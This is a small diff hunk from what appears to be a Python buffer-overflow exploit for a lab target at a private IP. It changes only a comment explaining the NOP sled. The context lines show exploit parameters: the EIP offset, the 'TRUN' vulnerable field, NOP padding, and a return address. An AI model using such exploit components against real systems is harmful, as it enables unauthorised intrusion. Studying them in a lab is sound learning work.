@@ -36,7 +36,7 @@ EIP_POS=2003
 IP="192.168.122.214" ; PRT=9999
 vf=b"TRUN /.:/" # Vuln. field
 A=b"\x41"       # The char 'A'
-NOP=b"\x90"     # NOP sled (what this does is basically, a machine instructions which - points to the next one, and if that (next one) also is a NOP(\x90) it just repeats, go to the next one, until our it have ticked along to our payload, and the shellcode (sh) is executed.)
+NOP=b"\x90"     # NOP sled (what this does is basically, a machine instruction which - points to the next one, and if that (next one) also is a NOP(\x90) it just repeats, go to the next one, until our it have ticked along to our payload, and the shellcode (sh) is executed.)
 NOPpadding = b"\x90"*10
 EIP=b"\xaf\x11\x50\x62"
 
